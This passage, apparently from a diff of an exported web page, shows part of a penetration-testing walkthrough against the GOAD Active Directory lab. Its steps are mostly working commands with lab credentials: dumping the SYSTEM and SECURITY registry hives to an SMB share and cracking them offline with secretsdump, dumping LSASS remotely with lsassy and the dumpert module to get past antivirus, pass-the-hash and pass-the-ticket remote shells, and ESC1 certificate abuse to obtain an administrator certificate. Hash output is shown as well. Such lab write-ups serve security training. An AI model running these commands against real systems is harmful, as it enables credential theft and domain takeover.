-</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8015-96e8-d33833867dcc" class="">Then we can use <a href="http://reg.py">reg.py</a> from <a href="https://github.com/fortra/impacket/blob/master/examples/reg.py">Impacket</a> to make the SAM &amp; SYSTEM requests.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a8-98c7-dfcfe8bca4c4" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;_</code><em><code>L0ngCl@w_</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SYSTEM&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b8-a159-cb5375d1a4c7" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;_</code><em><code>L0ngCl@w_</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807b-a174-fc6db760c605" class="">Then we can extract the contain offline.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8028-97eb-e89647a9cd54" class=""><code>secretsdump -security SECURITY.save -system SYSTEM.save LOCAL</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-8067-8398-dfc60dcc70f5" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
+</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8015-96e8-d33833867dcc" class="">Then we can use <a href="http://reg.py">reg.py</a> from <a href="https://github.com/fortra/impacket/blob/master/examples/reg.py">Impacket</a> to make the SAM &amp; SYSTEM requests.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a8-98c7-dfcfe8bca4c4" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;_</code><em><code>L0ngCl@w_</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SYSTEM&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b8-a159-cb5375d1a4c7" class=""><code><a href="http://reg.py/">reg.py</a></code><code> north/jeor.mormont:&#x27;_</code><em><code>L0ngCl@w_</code></em><code>&#x27;@10.4.10.22 save -keyName &#x27;HKLM\SECURITY&#x27; -o &#x27;\\10.4.10.1\share&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807b-a174-fc6db760c605" class="">Then we can extract the contain offline.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8028-97eb-e89647a9cd54" class=""><code>secretsdump -security SECURITY.save -system SYSTEM.save LOCAL</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8067-8398-dfc60dcc70f5" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
 
 [*] Target system bootKey: 0x928d80db0d4066816b5b48e573ce4297
 [*] Dumping cached domain logon information (domain/username:hash)
@@ -297,7 +190,7 @@ NL$KM:10a01429cde3435824372b048f67cdf38a962f6edda9f4c33e4bcb66faf65f17dbe3878d42
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803b-a211-fca66417be37" class=""><strong>Domain Cached credentials 2. </strong></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e9-9bf7-f65ef0a703c3" class=""> <code>NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405</code> this is the well known</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80de-9d65-c00547857387" class="">This hash can NOT be used for Pass The Hash and must be cracked. That kind of hash is very strong and long to break, so unless the password is very weak it will take an eternity to crack. If Hashcat is used to crack this hash the we use the mode <strong>2100.</strong></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80c0-a696-f5de66d508c9" class="">
 </p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80d0-8b15-f3561d87de64" class="">Machine Account Hashes <code>$MACHINE.ACC</code>.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80be-a3de-e780002c1a0b" class=""><code>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:a8573f70897bd596742b3b9f2699ee81</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808e-a1a9-f5770c53adfd" class="">This contains the NT hash of the machine account, here it is<code><strong>22d57aa0196b9e885130414dc88d1a95<br/></strong></code>Remember a machine account is a valid account on the domain.The machine account (<code><strong>castelblack$</strong></code>) + the hash NT we just retreive can be use to query the ldap.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803c-9e44-d07e0f3fc0bb" class="">
 </p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-806e-8c5e-f6ab6f62cae5" class="">Service account credentials</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8031-ae93-c1a82b0ff6f0" class=""><code>[*] _SC_MSSQL$SQLEXPRESS<br/>(Unknown User):YouWillNotKerboroast1ngMeeeeee</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8049-a147-e084f9c1418e" class="">This is the sql_svc account register on castel Braavos computer.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805f-9d7a-d389034da478" class="">
-</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-809f-99e0-e0a7351b2734" class="">DPAPI key Credentials.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808d-a6a3-e1935ff045b4" class="">The DPAPI keys used for encrypting the user&#x27;s RSA keys stored under <code>%APPDATA%\Microsoft\Protect\{SID}</code> directory, where {SID} is the <strong>Security Identifier</strong> of that user. <br/>The DPAPI key is stored in the same file as the master key that protects the users private keys. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using<code>dir</code> from the cmd, but you can list it from PS).</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8024-98f1-fcb777833bad" class="">Autologon helps you to conveniently customize the built-in Autologon mechanism for Windows. Rather than waiting for a user to enter their name and password, Windows will automatically log in to the required user using the credentials you submit with Autologon, which are encrypted in the registry.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-80ee-8d4b-d6365e79a42e" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-809f-99e0-e0a7351b2734" class="">DPAPI key Credentials.</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808d-a6a3-e1935ff045b4" class="">The DPAPI keys used for encrypting the user&#x27;s RSA keys stored under <code>%APPDATA%\Microsoft\Protect\{SID}</code> directory, where {SID} is the <strong>Security Identifier</strong> of that user. <br/>The DPAPI key is stored in the same file as the master key that protects the users private keys. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using<code>dir</code> from the cmd, but you can list it from PS).</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8024-98f1-fcb777833bad" class="">Autologon helps you to conveniently customize the built-in Autologon mechanism for Windows. Rather than waiting for a user to enter their name and password, Windows will automatically log in to the required user using the credentials you submit with Autologon, which are encrypted in the registry.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-80ee-8d4b-d6365e79a42e" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
@@ -310,7 +203,7 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}</code>
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808e-a15c-e035355c7993" class=""><strong>RAM is volatile memory that temporarily stores the files you are working on.</strong> <br/><strong>ROM is non-volatile memory that permanently stores instructions for your computer.<br/></strong></p></div></div></p></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8074-9d89-e6a30e364cb4" class="bulleted-list"><li style="list-style-type:disc">By running tools like mimikatz it is possible to dump the contains of the LSASS process.</li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-802f-ab48-fc5f240ec836" class="bulleted-list"><li style="list-style-type:disc">A tool is particulary usefull in lateral move + lsass dump remotely : <a href="https://github.com/Hackndo/lsassy">lsassy</a></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-80a0-945c-fdb04b2c06ba" class="bulleted-list"><li style="list-style-type:disc">This tool combine multiple technics to dump lsass remotely on multiple computer.</li></ul></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-809b-8872-d0b87bb2e3b6" class="">
 </p></div><div style="display:contents" dir="auto"><blockquote id="30c79e9a-d7c9-80fd-a2aa-e7ee2c9e1093" class=""><mark class="highlight-red">Dumping LSASS almost always ring a red alert on the anti-virus of the target computer.</mark><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80b8-9773-c3734186681e" class="block-color-red">We will need to use AV bypass techniques to be able to dump the lsass.exe process.</p></div></blockquote></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80db-97d4-c5f7f135f499" class="">
 </p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-80f5-9a42-e5985ff6cc9e" class="">NetExec</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8026-8edf-d06d07c38485" class="">we can use NetExec with the following command, but since we do  have AV activated, we wont be able to retrieve the information, the AV will detect and block it.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8004-a14e-ffda0622c25b" class=""><code>netexec smb 10.4.10.22 -u &#x27;jeor.mormont&#x27; -p &#x27;</code><em><code>L0ngCl@w</code></em><code>&#x27; -M lsassy</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-800d-8860-edcc7a60fdaf" class="">
-</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8013-9d72-d17497bb8997" class="">Lsassy with Dumpertdll</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8021-8239-f4f28ce520b8" class="">If we do have AV activated we can use <strong>lsassy</strong> combined with the <a href="https://github.com/outflanknl/Dumpert">dumpert</a> module. Be aware that dumpert needs to be compiled to get the DLL file.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8022-a208-c1dc0dd45616" class="">Note: After issuing the command, this may take some time, PLEASE WAIT.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8029-9c74-febd3bb8dfc8" class=""><code>lsassy -d north.sevenkingdoms.local -u &#x27;jeor.mormont&#x27; -p &#x27;</code><em><code>L0ngCl@w</code></em><code>&#x27; 10.4.10.22 -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-8066-8554-d47eb2d59aa8" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">dumpertdll uploaded
+</p></div><div style="display:contents" dir="auto"><h3 id="30c79e9a-d7c9-8013-9d72-d17497bb8997" class="">Lsassy with Dumpertdll</h3></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8021-8239-f4f28ce520b8" class="">If we do have AV activated we can use <strong>lsassy</strong> combined with the <a href="https://github.com/outflanknl/Dumpert">dumpert</a> module. Be aware that dumpert needs to be compiled to get the DLL file.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8022-a208-c1dc0dd45616" class="">Note: After issuing the command, this may take some time, PLEASE WAIT.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8029-9c74-febd3bb8dfc8" class=""><code>lsassy -d north.sevenkingdoms.local -u &#x27;jeor.mormont&#x27; -p &#x27;</code><em><code>L0ngCl@w</code></em><code>&#x27; 10.4.10.22 -m dumpertdll -O dumpertdll_path=Outflank-Dumpert-DLL.dll</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8066-8554-d47eb2d59aa8" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">dumpertdll uploaded
 NORTH\jeor.mormont                     [NT] 6dccf1c567c56a40e56691a723a49664 | [SHA1] 7774de0d0e1f76a478cafe4170c6628ea751d955
 NORTH\robb.stark                       [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c
 NORTH\CASTELBLACK$                     [NT] a8573f70897bd596742b3b9f2699ee81 | [SHA1] 81a859cbe03909854ea8bce3011c0a6a537e6964
@@ -355,7 +248,7 @@ NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL -
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80df-947a-e2100bbba0b5" class="">Once we finish it we can delete it again.<br/><code>reg.py NORTH/catelyn.stark@10.4.10.11 -hashes &#x27;:cba36eccfd9d949c73bc73715364aff5&#x27; delete -keyName &#x27;HKLM\System\CurrentControlSet\Control\Lsa&#x27; -v &#x27;DisableRestrictedAdmin&#x27;</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80d7-b602-e6e1d069381a" class="image"><a href="images/image-353.png"><img style="width:887px" src="images/image-353.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a2-9034-cc4cc8be60f2" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805b-91f8-dee1a17248f6" class="">
 </p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-8044-921a-c48f0a93dd7d" class="">Ticket Granting Ticket</h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e4-9f87-db5e7548d11f" class="">Continuing with user Catelyn.stark! We can also use Catelyn.stark NT Hash to request a Kerberos Ticket by requesting the TGT</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807d-9fe9-ce1d1929368a" class=""><code><a href="http://gettgt.py/">getTGT.py</a></code><code> -hashes &#x27;:cba36eccfd9d949c73bc73715364aff5&#x27; north.sevenkingdoms.local/catelyn.stark</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8092-8575-eec8c8b47062" class="image"><a href="images/image-354.png"><img style="width:887px" src="images/image-354.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8080-b11a-ea5bdaef0655" class="">We are able to retrieve Catelyn.stark ticket, its saved as catelyn.stark.ccache, let’s now use Pass The Ticket by exporting the .ccache to a variable called <code>KRB5CCNAME</code>.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-808c-b65a-fe2716e4d727" class=""><code>export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache </code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-803c-a773-ceb578deab09" class="">We can now the remote access with <a href="http://wmiexec.py">wmiexec.py</a> or evil-winrm but this time using user’s ticket instead of the NT Hash.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80a4-ae49-f3466df9f97d" class=""><code>wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-8023-83e5-c00ffd02c289" class="image"><a href="images/image-356.png"><img style="width:887px" src="images/image-356.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8055-9011-ee1eeca6eaea" class="">
-</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e5-8949-f7cf0e7d70f4" class="">We can also use Evil-WinRM with the ticket, with the following steps.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8045-a02b-decda3b88530" class="">1 - We export the ticket: <code>export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8052-abb6-eeb830b8b4ec" class="">2 - We Add realm to <code>/etc/krb5.conf</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="30c79e9a-d7c9-8084-8769-c393fd24f51d" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[libdefaults]
+</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e5-8949-f7cf0e7d70f4" class="">We can also use Evil-WinRM with the ticket, with the following steps.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8045-a02b-decda3b88530" class="">1 - We export the ticket: <code>export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache</code></p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8052-abb6-eeb830b8b4ec" class="">2 - We Add realm to <code>/etc/krb5.conf</code></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="30c79e9a-d7c9-8084-8769-c393fd24f51d" class="code code-wrap"><code class="language-Shell" style="white-space:pre-wrap;word-break:break-all">[libdefaults]
         default_realm = NORTH.SEVENKINGDOMS.LOCAL
 
 
@@ -372,7 +265,7 @@ NORTH.SEVENKINGDOMS.LOCAL\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL -
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-807a-9633-eedd5c7b830e" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8052-a1b4-fb70c51e756e" class="">
 </p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80e4-948e-ec0e9b1bc750" class="">
-</p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-80bf-b945-ca8a48dc5805" class=""><strong>Certificate</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8030-a3c9-c211a07b5a49" class="">In case we care exploiting a ESC1 vulnerability, we are able to request the certificate of a user and get the Hash then use it to request the TGT.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80dc-a8ad-eedfd6633f55" class="">By using Certipy we are able to accomplish that. here we are using the ESC1 vulnerability that we do have to request the administrator certificate.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805c-b16a-d1c123287613" class=""><code>certipy req -u khal.drogo@essos.local -p &#x27;horse&#x27; -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80f0-9dc3-ff08c0e9eb86" class="image"><a href="images/image-358.png"><img style="width:887px" src="images/image-358.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d4-b221-f790d320e7a6" class="">We were able to get the Administrator certificate and we have it as administrator.pfx, now let’s use this certificate to request the administrator Ticket Granting Ticket.</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8086-a760-c7b1cb7a1ce3" class="toggle"><li>
+</p></div><div style="display:contents" dir="auto"><h1 id="30c79e9a-d7c9-80bf-b945-ca8a48dc5805" class=""><strong>Certificate</strong></h1></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-8030-a3c9-c211a07b5a49" class="">In case we care exploiting a ESC1 vulnerability, we are able to request the certificate of a user and get the Hash then use it to request the TGT.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80dc-a8ad-eedfd6633f55" class="">By using Certipy we are able to accomplish that. here we are using the ESC1 vulnerability that we do have to request the administrator certificate.</p></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-805c-b16a-d1c123287613" class=""><code>certipy req -u khal.drogo@essos.local -p &#x27;horse&#x27; -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local</code></p></div><div style="display:contents" dir="ltr"><figure id="30c79e9a-d7c9-80f0-9dc3-ff08c0e9eb86" class="image"><a href="images/image-358.png"><img style="width:887px" src="images/image-358.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="30c79e9a-d7c9-80d4-b221-f790d320e7a6" class="">We were able to get the Administrator certificate and we have it as administrator.pfx, now let’s use this certificate to request the administrator Ticket Granting Ticket.</p></div></details></li></ul></div><div style="display:contents" dir="auto"><ul id="30c79e9a-d7c9-8086-a760-c7b1cb7a1ce3" class="toggle"><li><details open="">
         </section>
         <div class="page-nav"><a href="part-07.html" class="nav-btn">← Previous</a><a href="part-09.html" class="nav-btn">Next →</a></div>
       </article>
